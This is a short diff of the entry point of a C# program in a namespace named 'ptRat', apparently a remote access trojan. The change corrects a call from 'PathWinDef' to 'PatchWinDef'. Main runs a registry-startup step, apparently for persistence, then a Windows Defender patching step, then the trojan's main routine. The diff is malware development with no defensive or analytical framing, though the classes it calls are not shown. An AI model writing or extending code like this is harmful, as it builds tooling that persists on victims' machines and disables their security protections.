@@ -7,7 +7,7 @@ namespace ptRat
         static void Main(string[] args)
         {
             new RegStartup();
-            new PathWinDef();
+            new PatchWinDef();
             new Main();
         }
     }
